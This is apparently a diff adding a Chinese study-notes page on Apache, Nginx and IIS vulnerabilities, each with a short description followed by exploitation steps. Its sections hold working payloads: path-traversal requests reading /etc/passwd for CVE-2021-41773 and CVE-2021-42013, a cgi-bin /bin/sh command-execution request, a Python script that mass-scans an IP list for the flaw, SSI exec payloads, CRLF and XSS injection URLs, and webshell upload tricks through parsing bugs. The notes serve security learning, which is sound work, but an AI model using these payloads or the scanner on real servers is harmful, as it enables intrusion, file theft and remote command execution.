+<li><code>DirectoryIndex index.html</code>（默认首页）</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27133416789">(18 封私信 / 48 条消息) 使用Apache实现网站服务 - 知乎</a></p>
+<h3 id="apache-httpd-换行解析漏洞cve-2017-15715"><a class="markdownIt-Anchor" href="#apache-httpd-换行解析漏洞cve-2017-15715"></a> <strong>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</strong></h3>
+<h4 id="漏洞介绍"><a class="markdownIt-Anchor" href="#漏洞介绍"></a> 漏洞介绍</h4>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本中存在一个解析漏洞</strong>，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
+<p>上传php文件时在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是一个<code>\x0A</code>），不再拦截，这里只需要选中0d，右击选择insert byte…后，输入0a即可插入至里面，然后发送。</p>
+<p><img src="../images/image-20260325200319187.png" alt="image-20260325200319187" /></p>
+<p>后续访问<code>http:ip地址:端口/文件名.php%0a</code>即可</p>
+<h3 id="apache多后缀解析漏洞apache_parsing_vulnerability"><a class="markdownIt-Anchor" href="#apache多后缀解析漏洞apache_parsing_vulnerability"></a> <strong>Apache多后缀解析漏洞（apache_parsing_vulnerability）</strong></h3>
+<h4 id="漏洞介绍-2"><a class="markdownIt-Anchor" href="#漏洞介绍-2"></a> 漏洞介绍</h4>
+<p>使用module模式与php结合的所有版本,apache存在未知扩展名解析漏洞;使用fastcig模式与php结合的所有版本,apache不存在此漏洞。</p>
+<p>形如：index.php.asc.cdb格式的，就是多后缀。Apache对文件名后缀的识别是从后往前进行的，当遇到不认识的后缀时，继续往前，直到识别。index.php.asc.cdb，在特定配置下，Apache会将其解析为PHP文件，利用此特性，我们可以绕过上传文件后缀检测，达到上传webshell的目的。</p>
+<p>配置如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br><span class="line">#或者</span><br><span class="line">&lt;FilesMatch &quot;.+\.ph(ar|p|tml)&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h4>
+<p>php后面添加一个无法识别的后缀即可解析为php文件：</p>
+<p><img src="../images/image-20260325201012533.png" alt="image-20260325201012533" /></p>
+<p><img src="../images/image-20260325201025566.png" alt="image-20260325201025566" /></p>
+<h3 id="apache-http-路径穿越漏洞cve-2021-41773"><a class="markdownIt-Anchor" href="#apache-http-路径穿越漏洞cve-2021-41773"></a> <strong>Apache HTTP 路径穿越漏洞（CVE-2021-41773）</strong></h3>
+<h4 id="漏洞介绍-3"><a class="markdownIt-Anchor" href="#漏洞介绍-3"></a> 漏洞介绍</h4>
+<p>在其<strong>2.4.49版本</strong>中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
+<ul>
+<li>版本等于2.4.49</li>
+<li>穿越的目录允许被访问（默认情况下是不允许的）</li>
+</ul>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或</p>
+<p>cgid的服务器上执行任意命令。</p>
+<h4 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h4>
+<p>POC:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令。<br />
+POC：<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code> 最下面添加<code>echo;id</code></p>
+<p>批量检测POC:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"> </span><br><span class="line"><span class="comment">#添加Headers信息</span></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;server=Apache2.4.49.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">     ipv = ip.strip(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">     url = <span class="string">f&#x27;<span class="subst">&#123;ipv&#125;</span>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&#x27;</span></span><br><span class="line">     <span class="comment">#防止ssl报错</span></span><br><span class="line">     context = ssl._create_unverified_context()</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">          re = urllib.request.Request(url=url,headers=headers)</span><br><span class="line">          response = urllib.request.urlopen(re,context=context,timeout=<span class="number">3</span>)</span><br><span class="line">          response = response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">          <span class="keyword">if</span> <span class="string">&quot;root:x:&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(response):</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">f&quot;\033[0;31m<span class="subst">&#123;url&#125;</span>\033[0m 可能存在漏洞&quot;</span>)</span><br><span class="line">               <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;vul.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(ipv+<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ipv&#125;</span>不存在漏洞&quot;</span>)</span><br><span class="line">     <span class="keyword">except</span> Exception <span class="keyword">as</span> w:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ipv&#125;</span>不存在漏洞&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="apache-http-路径穿越漏洞cve-2021-42013"><a class="markdownIt-Anchor" href="#apache-http-路径穿越漏洞cve-2021-42013"></a> <strong>Apache HTTP 路径穿越漏洞（CVE-2021-42013）</strong></h3>
+<h4 id="漏洞简介"><a class="markdownIt-Anchor" href="#漏洞简介"></a> 漏洞简介</h4>
+<p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞CVE-2021-41773进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。<br />
+攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p>这个漏洞可以影响<strong>Apache HTTP Server 2.4.49以及2.4.50两个版本</strong>。</p>
+<h4 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h4>
+<p>这里总体来说和CVE-2021-41773步骤都是一样的，只是将<code>.%2e</code>替换为<code>.%%32%65</code>，若使用原先的payload无法使用，那么就说明2.4.50进行了修复。</p>
+<p>在GET处插入POC，用来读取任意文件，但是需要注意/icons必须是一个存在且可访问的目录。<br />
+POC：<code>/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</code></p>
+<p>如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">http://172.16.10.102:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.10.102:8080</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;29cd-5cde5771ac040-gzip&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Sat, 09 Oct 2021 06:18:33 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"> </span><br><span class="line">echo Content-Type: text/plain; echo; 命令</span><br></pre></td></tr></table></figure>
+<h3 id="apache-ssi-远程命令执行漏洞"><a class="markdownIt-Anchor" href="#apache-ssi-远程命令执行漏洞"></a> <strong>Apache SSI 远程命令执行漏洞</strong></h3>
+<h4 id="漏洞介绍-4"><a class="markdownIt-Anchor" href="#漏洞介绍-4"></a> 漏洞介绍</h4>
+<p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器<strong>开启了SSI与CGI支持</strong>，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
+<h4 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h4>
+<p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件，然后在文件中写入命令。<br />
+命令：<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code></p>
+<h2 id="nginx"><a class="markdownIt-Anchor" href="#nginx"></a> <strong>Nginx</strong></h2>
+<p>Nginx 既是 Web 服务器，也是<strong>反向代理、负载均衡器、HTTP/TCP/UDP 代理、缓存层</strong>。</p>
+<h3 id="安装及部署-2"><a class="markdownIt-Anchor" href="#安装及部署-2"></a> 安装及部署</h3>
+<p>同样去官网下载解压：<br />
+<img src="../images/v2-b8ee8bcc7bb5400a0532ef62467bc006_1440w.webp" alt="img" /></p>
+<p>双击nginx.exe启动nginx</p>
+<p>本地访问（默认端口80）：<a target="_blank" rel="noopener" href="http://127.0.0.1">http://127.0.0.1</a> 用以验证启动是否成功</p>
+<p><img src="../images/image-20260325203932942.png" alt="image-20260325203932942" /></p>
+<p>配置文件路径（实际以自己安装路径为准）： <code>D:/software/Nginx/nginx-1.26.2/conf/nginx.conf</code></p>
+<p><img src="../images/image-20260325203947841.png" alt="image-20260325203947841" /></p>
+<p>nginx.con配置文件说明</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行用户</span></span><br><span class="line"><span class="comment">#user  nobody;</span></span><br><span class="line"><span class="comment">#启动进程,通常设置成和cpu的数量相等</span></span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#全局错误日志</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PID文件，记录当前启动的nginx的进程ID</span></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#工作模式及连接数上限</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>; <span class="comment">#单个后台worker process进程的最大并发链接数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment">#设定mime类型(邮件支持类型),类型由mime.types文件定义</span></span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设定日志</span></span><br><span class="line">    <span class="comment">#log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">    <span class="comment">#                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">    <span class="comment">#                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用，</span></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#连接超时时间</span></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip压缩开关</span></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#HTTP服务器</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="comment">#监听8080端口，8080端口是知名端口号，用于HTTP协议</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#定义使用localhost访问</span></span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#编码格式</span></span><br><span class="line">        <span class="comment">#charset koi8-r;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#反向代理的路径，location 后面设置映射的路径</span></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#错误处理页面（可选择性配置）</span></span><br><span class="line">        <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Linux：<br />
+<img src="../images/v2-2f738eae2fdf256538ccdfb7bf323bae_1440w.webp" alt="img" /></p>
+<h3 id="crlf注入漏洞"><a class="markdownIt-Anchor" href="#crlf注入漏洞"></a> <strong>CRLF注入漏洞</strong></h3>
+<h4 id="漏洞简介-2"><a class="markdownIt-Anchor" href="#漏洞简介-2"></a> 漏洞简介</h4>
+<p>Nginx会将<code>$uri</code>进行解码，导致传入<code>%0d%0a</code>即可引入换行符，造成CRLF注入漏洞。<br />
+错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line"> return 302 https://$host$uri<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们一旦在请求路径内添加换行符的urlcode编码，就可以将其混到返回的数据包内起到修改返回数据的作用。甚至可以让恶意语句进入返回体内部引发更严重的XSS攻击。</p>
+<h4 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h4>
+<p>我们将请求中插入编码，就可以注入Set-Cookie头。<br />
+payload：<code>http://your-ip:8080/%0d%0aSet-Cookie:%20a=1</code></p>
+<p><img src="../images/image-20260325202518040.png" alt="image-20260325202518040" /></p>
+<p>我们发送两个连续的换行\r\n后，可以直接修改返回报文的返回体。插入js代码引发xss。<br />
+payload：<code>http://your-ip:8080/%0d%0a%0d%0aalert(1)</code></p>
+<p><img src="../images/image-20260325202553079.png" alt="image-20260325202553079" /></p>
+<h3 id="目录穿越漏洞"><a class="markdownIt-Anchor" href="#目录穿越漏洞"></a> <strong>目录穿越漏洞</strong></h3>
+<h4 id="漏洞简介-3"><a class="markdownIt-Anchor" href="#漏洞简介-3"></a> 漏洞简介</h4>
+<p>Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。<br />
+错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line"> alias /home/<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但我们注意到<code>/files</code>没有加后缀/，而alias设置的<code>/home/</code>是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录。</p>
+<h4 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h4>
+<p>payload：<code>http://your-ip:8081/files../</code></p>
+<p>可以成功穿越到根目录</p>
+<h3 id="add_header被覆盖"><a class="markdownIt-Anchor" href="#add_header被覆盖"></a> <strong>add_header被覆盖</strong></h3>
+<h4 id="漏洞简介-4"><a class="markdownIt-Anchor" href="#漏洞简介-4"></a> 漏洞简介</h4>
+<p>Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。<br />
+如下列代码，整站（父块中）添加了CSP头：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#x27;self&#x27;&quot;<span class="comment">;</span></span><br><span class="line">add_header X-Frame-Options DENY<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">location</span> = /test1 &#123;</span><br><span class="line"> rewrite ^(.*)$ /xss.html break<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">location</span> = /test2 &#123;</span><br><span class="line"> add_header X-Content-Type-Options nosniff<span class="comment">;</span></span><br><span class="line"> rewrite ^(.*)$ /xss.html break<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效</p>
+<h4 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h4>
+<p>这里由于新的一点的浏览器都进行了一些过滤，所以导致无法弹出。<br />
+payload：<code>http://your-ip:8082/test2#%3Cscript%3Ealert(1)%3C/script%3E</code></p>
+<h3 id="解析漏洞"><a class="markdownIt-Anchor" href="#解析漏洞"></a> <strong>解析漏洞</strong></h3>
+<h4 id="漏洞介绍-5"><a class="markdownIt-Anchor" href="#漏洞介绍-5"></a> 漏洞介绍</h4>
+<p><code>cgi.fix_pathinfo=1</code>  #<strong>php.ini</strong> — 在php.ini中开启路径修复功能</p>
+<p><code>security.limit_extensions = .php .jpg</code>  #<strong>php-fpm.conf</strong> — 在php-fpm模块中开启了.jpg的php解析</p>
+<p>这二者合在一起，在网页有文件上传功能时，就会触发上传漏洞，总结来说漏洞成因就是<strong>同时开启路径修复和图片后缀名解析</strong></p>
+<h4 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h4>
+<p>目前来看我们看到还是一张图片。<br />
+<code>http://your-ip/uploadfiles/nginx.png</code></p>
+<p>我们在图片的链接后面添加/.php来进行解析，通过添加后的解析效果来看，已经成功的将图片解析成php文件了。</p>
+<p><code>http://your-ip/uploadfiles/nginx.png/.php</code></p>
+<p>准备了一个图片马，当然图片马有很多，将代码写入图片马中即可，然后上传。</p>
+<p>上传后系统将图片重命名为：<code>f47454d1d3644127f42070181a8b9afc.jpg</code>那么到时候访问的时候就使用新的名字来访问。</p>
+<p>目前我上传的就是一张百度的图片，但是在图片中插入了图片马，我们对其进行解析试试<br />
+<code>http://your-ip/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg</code></p>
+<p>可以看到成功解析了图片马</p>
+<p><code>http://your-ip/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg.php</code></p>
+<h2 id="iis"><a class="markdownIt-Anchor" href="#iis"></a> IIS</h2>
+<p>IIS（Internet Information Services）是微软公司开发的一个Web服务器，<strong>用来提供网页服务</strong>。简单来说，它就像是一个“门卫”，<strong>负责接收和处理你通过浏览器发送的网页请求，然后将网页内容返回给你。它通常用于Windows服务器环境。</strong></p>
+<p><strong>IIS</strong> 只能在Windows上运行，因为它是微软的产品。</p>
+<p><strong>Apache</strong> 和 <strong>Nginx</strong> 都是跨平台的，可以在Linux、Windows、macOS等操作系统上运行</p>
+<h3 id="安装及部署-3"><a class="markdownIt-Anchor" href="#安装及部署-3"></a> 安装及部署</h3>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Leewayah/article/details/129415698">Windows IIS服务器安装（超详细）_iis安装-CSDN博客</a></p>
+<h3 id="iis60-put漏洞"><a class="markdownIt-Anchor" href="#iis60-put漏洞"></a> IIS6.0 PUT漏洞</h3>
+<h4 id="漏洞介绍-6"><a class="markdownIt-Anchor" href="#漏洞介绍-6"></a> 漏洞介绍</h4>
+<p><strong>IIS6.0 sever在web服务扩展中开启了WebDAV</strong>。WebDAV是在一中HTTP1.1的扩展协议。它扩展了HTTP1.1，在GET、POST、HEAD等几个http标准方法以外添加了一些新的方法，如PUT，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，利用PUT方法可直接向服务器上传恶意文件，控制服务器。<strong>导致任意文件上传</strong></p>
+<p><strong>总结：<code>IIS&lt;=6.0</code> 目录权限开启写入，开启WebDAV，设置为允许-&gt;文件上传漏洞</strong></p>
+<h4 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h4>
+<p><img src="../images/image-20260325205154576.png" alt="image-20260325205154576" /></p>
+<h3 id="短文件名猜解"><a class="markdownIt-Anchor" href="#短文件名猜解"></a> 短文件名猜解</h3>
+<h4 id="漏洞简介-5"><a class="markdownIt-Anchor" href="#漏洞简介-5"></a> 漏洞简介</h4>
+<p><strong>iis全版本都可能有这个问题</strong></p>
+<p>此漏洞实际是由HTTP请求中<strong>旧DOS 8.3名称约定(SFN)的代字符(~)波浪号</strong>引起的。它<strong>允许远程攻击者在Web根目录下公开文件和文件夹名称</strong>(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。</p>
+<p>为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir /x</p>
+<p><img src="../images/image-20260325205255391.png" alt="image-20260325205255391" /></p>
+<h4 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner(py%E7%89%88%E6%9C%AC)%E5%8F%AA%E8%83%BD%E6%8E%A2%E9%92%88%E5%89%8D6%E4%BD%8D">https://github.com/lijiejie/IIS_shortname_Scanner(py版本)只能探针前6位</a></p>
+<p><img src="../images/6e0f2fb5f62404a681b300fb189355cb.png" alt="img" /></p>
+<p><img src="../images/4e92f53d5a80901c679d364dc595fdd5.png" alt="img" /></p>
+<p><img src="../images/5855182364067fc468384b8704a1d2b6.png" alt="img" /></p>
+<h3 id="iis6-解析漏洞"><a class="markdownIt-Anchor" href="#iis6-解析漏洞"></a> IIS6 解析漏洞</h3>
+<h4 id="漏洞简介-6"><a class="markdownIt-Anchor" href="#漏洞简介-6"></a> 漏洞简介</h4>
+<p>IIS 6 解析漏洞<br />
+1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析<br />
+2、该版本默认会将*.asp/目录下的所有文件当成Asp解析。<br />
+如：logo.asp;.jpg xx.asp/logo.jpg</p>
+<h3 id="iis7-解析漏洞"><a class="markdownIt-Anchor" href="#iis7-解析漏洞"></a> IIS7 解析漏洞</h3>
+<h4 id="漏洞简介-7"><a class="markdownIt-Anchor" href="#漏洞简介-7"></a> 漏洞简介</h4>
+<p>IIS 7.x 解析漏洞<br />
+在一个文件路径(/xx.jpg)后面加上/xx.php会将<code>/xx.jpg/xx.php</code> 解析为php文件</p>
+<h3 id="httpsyscve-2015-1635主要用作蓝屏破坏跟权限不挂钩"><a class="markdownIt-Anchor" href="#httpsyscve-2015-1635主要用作蓝屏破坏跟权限不挂钩"></a> HTTP.SYS（CVE-2015-1635）主要用作蓝屏破坏，跟权限不挂钩</h3>
+<h4 id="漏洞简介-8"><a class="markdownIt-Anchor" href="#漏洞简介-8"></a> 漏洞简介</h4>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
+<p>影响版本：Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</p>
